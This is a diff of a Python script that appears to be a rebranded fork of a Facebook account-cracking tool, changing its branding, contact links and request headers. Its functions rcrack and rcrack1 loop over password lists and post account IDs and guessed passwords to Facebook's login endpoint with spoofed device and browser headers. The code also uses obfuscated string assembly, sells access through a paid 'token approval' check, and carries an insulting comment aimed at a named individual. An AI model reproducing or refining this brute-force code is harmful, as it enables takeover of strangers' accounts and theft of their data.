@@ -1,4 +1,5 @@
- 
+#assalamowalikom OPEN source by Harry (Haris AKHTAR )
+#Fuck YATEEM kid AWAIS tahir 
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 g1=('A');g2=('K');g3=('I');g4=('N');g5=('G');g6=('1');g7=('1');g8=('0');pr=('-P');pr1=('R');pr2=('O')
 ghb=g1+g2+g3+g4+g5+g6+g7+g8
@@ -6,7 +7,7 @@ gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
 cx=('.g');cxx=('fig');xl=('/')
   
 import os,base64
-os.system('xdg-open https://web.facebook.com/nayem0242')
+os.system('xdg-open https://www.facebook.com/groups/893149411835087/?ref=share/')
 u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
 ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
 r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
@@ -758,7 +759,7 @@ def rcrack1(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;32m [N-XD] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;32m [Juttbrand] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
 			application_version_code=str(random.randint(000000000,999999999))
 			__iam_genius = random.choice(android_models)
@@ -852,17 +853,17 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'https://graph.facebook.com/',
+			header_freefb = {'authority':'mbasic.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'en-US,en;q=0.8',
-			'accept-encoding':'gzip, deflate, br',
-			'cache-control': 'max-age=0', 
-			'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
-			'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"',
+			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',
+			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"macOS"',
 			'sec-fetch-dest': 'document',
 			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'cross-site',
+			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
@@ -954,7 +955,7 @@ def menu_apikey():
   print("\033[1;37m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
   print("")
   print("  SEND KEY ON ADMIN WHATSAPP,,,,,,,,,,,,,,,  ");time.sleep(1)
-  os.system('xdg-open https://web.facebook.com/nayem0242')
+  os.system('xdg-open https://wa.me/+923231243823')
   print("");time.sleep(2)
   print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
   try:
@@ -968,7 +969,7 @@ def menu_apikey():
       
       print("\x1b[1;97m    Sorry Bro Token Key not AprovedðŸ˜“")
       print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://web.facebook.com/nayem0242 ')
+      os.system('xdg-open https://wa.me/ ')
       time.sleep(2)
       sys.exit()
   except:
@@ -995,15 +996,15 @@ def tnx():
   try:
     httpCaht = requests.get("https://test-paid.blogspot.com/?m=1").text
     if id in httpCaht:
-      print("\033[1;97m   YOUR TOKEN APROVED   ");time.sleep(2)
+      print("\033[1;97m   YOUR TOKEN APROVED ðŸ¥€ ");time.sleep(2)
       msg = str(os.geteuid())
       time.sleep(0.5)
       pass
     else:
       
-      print("\x1b[1;97m    Sorry Bro Your Token not Aproved “ ")
+      print("\x1b[1;97m    Sorry Bro Your Token not AprovedðŸ˜“ ")
       print("    Send payment to Admin and get aproval"); time.sleep(2)
-      os.system('xdg-open https://web.facebook.com/nayem0242 ')
+      os.system('xdg-open https://wa.me/ ')
       time.sleep(2)
       sys.exit()
   except:
